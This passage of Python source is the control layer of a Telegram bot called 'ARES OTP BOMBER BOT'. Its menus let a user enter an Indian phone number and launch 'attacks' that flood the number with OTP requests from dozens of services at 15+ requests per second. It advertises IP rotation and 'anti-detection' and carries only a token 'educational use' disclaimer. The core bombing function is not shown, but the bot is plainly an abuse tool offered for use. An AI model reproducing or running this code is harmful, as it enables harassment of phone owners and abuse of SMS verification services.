            reply_markup=reply_markup
        )
        
    elif data == "settings":
        keyboard = [
            [InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="⚙️ *BOT SETTINGS*\n\n"
                 "• Max Requests: Unlimited\n"
                 "• Speed: normal\n"
                 "• APIs: 5+ services\n"
                 "• Auto IP Rotation: Enabled\n"
                 "• Connection Pool: 500\n"
                 "• Timeout: 1.2 seconds\n\n"
                 "_Settings are optimized for maximum performance._",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
    elif data == "help":
        help_text = """
❓ *ARES BOT HELP*

📋 *COMMANDS:*
/start - Start bot
/attack - Start attack  
/status - Check status
/stop - Stop attacks
/stats - Show stats
/help - Show help

🎯 *HOW TO USE:*
1. Click START ATTACK
2. Enter phone number
3. Confirm attack
4. Watch live stats
5. Stop when done

⚡ *FEATURES:*
• Ultra-fast requests
• 35+ services
• Live statistics
• Auto-retry
• Anti-detection

⚠️ *FOR EDUCATIONAL USE ONLY*
"""
        keyboard = [
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text=help_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 MY ATTACKS", callback_data="my_attacks")],
            [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
            [InlineKeyboardButton("❓ HELP", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="🔥 *ARES OTP BOMBER BOT*\n\n"
                 "Select an option:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
    elif data.startswith("confirm_attack_"):
        phone = data.replace("confirm_attack_", "")
        attack_id = f"ARES_{user_id}_{int(time.time())}"
        
        # Start attack task
        task = asyncio.create_task(
            bomber_attack(phone, attack_id, user_id, update, context)
        )
        
        # Store task reference
        if attack_id in active_attacks:
            active_attacks[attack_id].task = task
        
        await query.edit_message_text(
            text=f"🚀 *ATTACK LAUNCHED!*\n\n"
                 f"🎯 Target: `+91{phone}`\n"
                 f"⚡ Speed: 15+ requests/sec\n"
                 f"📊 APIs: {len(API_CONFIGS)} services\n"
                 f"🆔 Attack ID: `{attack_id}`\n\n"
                 f"_Attack started successfully! You will receive live updates._",
            parse_mode=ParseMode.MARKDOWN
        )
        
    elif data == "cancel_attack":
        await query.edit_message_text(
            text="❌ *ATTACK CANCELLED*\n\n"
                 "No attack was started.",
            parse_mode=ParseMode.MARKDOWN
        )
        
    elif data == "stop_all_attacks":
        stopped_count = 0
        
        for attack_id, attack_info in list(active_attacks.items()):
            if attack_info.user_id == user_id:
                attack_info.running = False
                if attack_info.task:
                    attack_info.task.cancel()
                del active_attacks[attack_id]
                stopped_count += 1
        
        if stopped_count > 0:
            await query.edit_message_text(
                text=f"✅ *STOPPED {stopped_count} ATTACK(S)*\n\n"
                     f"All your attacks have been stopped.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.edit_message_text(
                text="📭 *NO ACTIVE ATTACKS*\n\n"
                     "No attacks to stop.",
                parse_mode=ParseMode.MARKDOWN
            )
            
    elif data == "view_stats":
        total_attacks = len(active_attacks)
        total_requests = sum(a.total_requests for a in active_attacks.values())
        total_otps = sum(a.real_otp_success for a in active_attacks.values())
        
        stats_text = f"""
📊 *BOT STATISTICS*

Active Attacks: {total_attacks}
Total Requests: {total_requests:,}
Total OTPs Sent: {total_otps:,}
APIs Available: {len(API_CONFIGS)}
Max Speed: 15+ req/sec
Bot Status: Online
"""
        
        await query.edit_message_text(
            text=stats_text,
            parse_mode=ParseMode.MARKDOWN
        )

def main():
    """Start the bot"""
    print(f"{Fore.GREEN}[ARES BOT] Initializing Telegram Bot...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[ARES BOT] Token: {BOT_TOKEN}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[ARES BOT] Services: {len(API_CONFIGS)} APIs{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[ARES BOT] Speed: 15+ requests/second{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[ARES BOT] Bot is starting...{Style.RESET_ALL}")
    
    # Create Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Add callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Add message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start the bot
    print(f"{Fore.GREEN}[ARES BOT] Bot is running! Press Ctrl+C to stop.{Style.RESET_ALL}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[ARES BOT] Bot stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ARES BOT] Error: {e}{Style.RESET_ALL}")
